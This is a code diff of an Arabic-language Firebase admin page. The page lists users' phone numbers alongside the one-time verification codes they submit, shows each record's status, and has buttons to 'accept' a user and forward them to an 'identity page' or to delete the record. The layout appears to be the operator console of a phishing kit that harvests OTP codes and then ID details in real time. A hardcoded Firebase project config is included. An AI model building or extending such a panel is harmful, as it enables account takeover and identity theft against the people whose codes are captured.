@@ -35,15 +35,18 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    import { getFirestore, collection, onSnapshot, query, orderBy, doc, deleteDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+    import { 
+        getFirestore, collection, onSnapshot, query, orderBy, 
+        doc, deleteDoc, setDoc 
+    } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
     const firebaseConfig = {
-      apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
-      authDomain: "barq-9ba61.firebaseapp.com",
-      projectId: "barq-9ba61",
-      storageBucket: "barq-9ba61.firebasestorage.app",
-      messagingSenderId: "1060477857765",
-      appId: "1:1060477857765:web:e1e2c606668209f364090c"
+        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
+        authDomain: "barq-9ba61.firebaseapp.com",
+        projectId: "barq-9ba61",
+        storageBucket: "barq-9ba61.firebasestorage.app",
+        messagingSenderId: "1060477857765",
+        appId: "1:1060477857765:web:e1e2c606668209f364090c"
     };
 
     const app = initializeApp(firebaseConfig);
@@ -71,18 +74,24 @@
                 <div class="info">
                     <div>جوال: <span class="phone">${data.phone || '---'}</span></div>
                     <div>الرمز: <span class="otp">${data.otp || 'بانتظار...'}</span></div>
+                    <div>الحالة: <span style="color:${data.status === 'accepted' ? 'green' : 'orange'}">${data.status || 'pending'}</span></div>
                 </div>
                 <div class="actions">
-                    <button class="btn accept" id="acceptBtn_${id}" data-id="${id}">قبول ✅</button>
-                    <button class="btn reject" data-id="${id}">حذف ❌</button>
+                    <button class="btn accept" id="acceptBtn_${id}" data-id="${id}">قبول</button>
+                    <button class="btn reject" data-id="${id}">❌</button>
                 </div>
             `;
             dataList.appendChild(card);
 
-            // ربط حدث القبول
+            // ربط حدث القبول (الطريقة الآمنة لإنشاء الحقل)
             document.getElementById(`acceptBtn_${id}`).onclick = async () => {
-                await updateDoc(doc(db, "users", id), { status: "accepted" });
-                alert("تم قبول المستخدم، سينتقل الآن لصفحة الهوية");
+                try {
+                    await setDoc(doc(db, "users", id), { status: "accepted" }, { merge: true });
+                    alert("تم قبول المستخدم بنجاح! سيتم تحويله لصفحة الهوية فوراً.");
+                } catch (e) {
+                    console.error("Error updating document: ", e);
+                    alert("حدث خطأ أثناء الاتصال بقاعدة البيانات.");
+                }
             };
         });
 
@@ -90,7 +99,7 @@
         document.querySelectorAll('.reject').forEach(btn => {
             btn.onclick = async (e) => {
                 const docId = e.target.getAttribute('data-id');
-                if(confirm('هل تريد حذف هذا السجل؟')) {
+                if(confirm('هل أنت متأكد من حذف هذا السجل؟')) {
                     await deleteDoc(doc(db, "users", docId));
                 }
             };
